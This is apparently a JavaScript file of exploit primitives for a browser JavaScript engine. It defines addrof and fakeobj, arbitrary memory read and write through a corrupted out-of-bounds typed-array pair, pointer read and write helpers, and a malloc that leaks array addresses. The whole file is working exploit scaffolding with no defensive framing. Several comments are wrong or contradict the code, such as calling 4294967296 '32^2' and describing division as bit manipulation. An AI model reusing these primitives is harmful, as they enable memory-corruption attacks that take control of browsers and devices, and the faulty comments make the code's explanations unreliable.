// Writes the lower 32 bits of the value to arr[4] and the upper 32 bits to arr[5].
// The value is the 64-bit integer that needs to be split and written to the array.
function Writei64(value, arr) {
  // Set the 4th index of arr to the lower 32 bits of the value
  arr[4] = value;
  // Set the 5th index of arr to the upper 32 bits of the value
  // which we get by dividing the value by 4294967296 (32^2)
  arr[5] = value / 4294967296;
}

// Combines the lower 32 bits from src[4] and the upper 32 bits from src[5] to form a 64-bit integer,
// returning the resulting 64-bit integer value.
function Readi48(src) {
  let val = src[4]; // Retrieve the lower 32 bits from the 4th index of 'src'.
  val += src[5] * 4294967296; // Retrieve the upper 32 bits from the 5th index of 'src' and combine them.
  return val; // Return the 64-bit integer value.
}

// Addrof primitive
function addrof(x) {
  leaker_obj.a = x;
  return Readi48(leaker_arr);
}
// Fakeobj primitive
function fakeobj(x) {
  Writei64(x, leaker_arr);
  return leaker_obj.a;
}

function read_mem_setup(addr, size) {
  Writei64(addr, oob_master);
  oob_master[6] = size;
}

function read_mem(pointer, size) {
  read_mem_setup(pointer, size);
  printf("%d bytes read from %x", size, pointer);
  return Array.from(oob_slave.slice(0, size));
}

function write_mem(p, data) {
  let size = data.length;
  Writei64(p, oob_master);
  oob_master[6] = size;
  oob_slave.set(data);
  printf("%d bytes written to %x", size, p);
}

function read_mem_as_string(p, sz) {
  let bytes = read_mem(p, sz);
  if (bytes.length == sz) {
    printf("%d bytes read and converted to text", sz);
    // Convert the bytes to a string and return it
    return String.fromCharCode(...bytes);
  } else printf("Bytes read don't match requested size");
  return null; // Return null to indicate an error
}

function read_mem_s(p, sz) {
  read_mem_setup(p, sz);
  return `${oob_slave}`;
}

function read_mem_b(p, sz) {
  read_mem_setup(p, sz);
  return oob_slave.slice(0, sz);
}

function read_ptr_at(addr) {
  let result = 0;
  let readData = read_mem(addr, 8);
  for (let i = 7; i >= 0; i--) {
    result *= 256;
    result += readData[i];
  }
  return result;
}

function write_ptr_at(addr, data) {
  let byteArray = [];
  for (let i = 0; i < 8; i++) {
    byteArray.push(data & 0xFF);
    // Use bit manipulation operations instead of division 
    // for better performance
    data /= 256;
  }
  write_mem(addr, byteArray);
}
const hex = (x) => "0x" + x.toString(16);

var malloc_nogc = [];
function malloc(size) {
  // Allocate a new Uint8Array with the specified size
  let arr = new Uint8Array(size);
  // Push the array into malloc_nogc
  malloc_nogc.push(arr);
  // Return the address of the array by reading its memory representation
  return read_ptr_at(addrof(arr) + 0x10);
}
